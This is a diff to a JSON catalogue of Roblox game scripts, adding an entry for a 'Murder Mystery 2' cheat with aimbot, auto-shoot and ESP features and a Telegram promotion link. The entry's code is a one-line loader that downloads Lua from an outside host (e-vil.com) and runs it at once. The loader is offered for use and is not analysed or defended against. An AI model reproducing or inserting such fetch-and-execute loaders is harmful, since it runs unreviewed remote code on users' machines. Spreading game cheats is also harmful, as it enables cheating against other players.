@@ -529,6 +529,16 @@
       "key_difficulty": "none",
       "script_side": "server",
       "date": "2026-04-27"
+    },
+    "script_1777319951": {
+      "name": "MM2 Script by Anbu",
+      "description": "\uD83C\uDDFA\uD83C\uDDF8 : Script \u2014 MM2 Script by Anbu\n\uD83C\uDDF7\uD83C\uDDFA : \u0421\u043A\u0440\u0438\u043F\u0442 \u2014 MM2 Script by Anbu\n\uD83D\uDD27 Features/\u0424\u0443\u043D\u043A\u0446\u0438\u0438: Auto shoot, Aimbot, FOV, shoot offset, ESP",
+      "code": "loadstring(game:HttpGet(\u0022https://e-vil.com/anbu/mm2main.lua\u0022))()\n-- // More scripts: t.me/XenoScriptsSupported",
+      "game": "Murder Mystery 2",
+      "keyless": true,
+      "key_difficulty": "none",
+      "script_side": "both",
+      "date": "2026-04-27"
     }
   }
 }
